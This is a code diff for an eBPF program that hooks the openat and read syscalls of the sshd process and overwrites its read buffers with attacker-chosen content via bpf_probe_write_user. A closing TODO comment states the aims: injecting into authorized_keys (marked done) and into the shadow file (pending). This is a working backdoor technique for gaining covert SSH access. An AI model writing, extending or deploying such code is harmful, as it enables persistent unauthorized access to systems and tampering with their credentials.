@@ -14,7 +14,6 @@
 #define filename_len_max 128
 #define overwritten_content_len_max 65536
 
-const volatile int target_pid = 0;
 const volatile int filename_len = 0;
 const volatile char filename[filename_len_max];
 
@@ -24,7 +23,7 @@ const volatile char overwritten_content[overwritten_content_len_max];
 struct elem {
     int pid;
     int fd;
-    int *buff;
+    unsigned long buff;
     int buff_len;
 };
 
@@ -41,7 +40,10 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
 {
     int tgid = bpf_get_current_pid_tgid();
     int pid = bpf_get_current_pid_tgid() >> 32;
-    if (pid != target_pid) {
+    char comm[10];
+    bpf_get_current_comm(&comm, 10);
+    
+    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
         return 0;
     }
 
@@ -69,11 +71,6 @@ SEC("tp/syscalls/sys_exit_openat")
 int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
 {
     int tgid = bpf_get_current_pid_tgid();
-    int pid = bpf_get_current_pid_tgid() >> 32;
-    if (pid != target_pid) {
-        return 0;
-    }
-
     struct elem *fd = bpf_map_lookup_elem(&pid_elem, &tgid);
     if (fd == 0) {
         return 0;
@@ -81,7 +78,12 @@ int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
     struct elem *e = fd;
     e->fd = ctx->ret;
 
-    bpf_printk("openat_exitpoint[%d]: fd = %d\n", pid, ctx->ret);
+    if (ctx->ret < 0) {
+        bpf_map_delete_elem(&pid_elem, &tgid);
+        return 0;
+    }
+
+    bpf_printk("openat_exitpoint[%d]: fd = %d\n", tgid, ctx->ret);
     return 0;
 }
 
@@ -89,25 +91,20 @@ SEC("tp/syscalls/sys_enter_read")
 int read_entrypoint(struct trace_event_raw_sys_enter *ctx)
 {
     int tgid = bpf_get_current_pid_tgid();
-    int pid = bpf_get_current_pid_tgid() >> 32;
-    if (pid != target_pid) {
-        return 0;
-    }
-
     struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
     if (e == 0) {
         return 0;
     }
 
     if (e->fd != ctx->args[0]) {
-        bpf_printk("Error read_entrypoint[%d]: fd: %d != %d\n", pid, e->fd, ctx->args[0]);
+        bpf_printk("Error read_entrypoint[%d]: fd: %d != %d\n", tgid, e->fd, ctx->args[0]);
         return 0;
     }
 
     e->buff = ctx->args[1];
     e->buff_len = ctx->args[2];
 
-    bpf_printk("read_entrypoint[%d]: fd = %d, buff_len = %d\n", pid, e->fd, e->buff_len);
+    bpf_printk("read_entrypoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
     return 0;
 }
 
@@ -115,10 +112,6 @@ SEC("tp/syscalls/sys_exit_read")
 int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
 {
     int tgid = bpf_get_current_pid_tgid();
-    int pid = bpf_get_current_pid_tgid() >> 32;
-    if (pid != target_pid) {
-        return 0;
-    }
     if (ctx->ret < 0) {
         return 0;
     }
@@ -127,11 +120,22 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
     if (e == 0) {
         return 0;
     }
-    long ret = bpf_probe_write_user((void*)e->buff, (void*)overwritten_content, overwritten_content_len+1); // +1 for null byte
+
+    if (overwritten_content_len+1 > ctx->ret) {
+        bpf_printk("Error read_exitpoint[%d]: buff_len: %d < %d\n", tgid, ctx->ret, overwritten_content_len+1);
+        bpf_map_delete_elem(&pid_elem, &tgid);
+        return 0;
+    }
+
+    bpf_probe_write_user((void*)e->buff, (void*)overwritten_content, overwritten_content_len+1); // +1 for null byte
     
-    bpf_printk("read_exitpoint[%d]: fd = %d, buff_len = %d\n", pid, e->fd, e->buff_len);
+    bpf_printk("read_exitpoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
     bpf_map_delete_elem(&pid_elem, &tgid);
     return 0;
 }
 
+/*
+- [x] Write into authorized_keys if it exists
+- [ ] Write into shadow if fetched
+*/
 char LICENSE[] SEC("license") = "GPL";
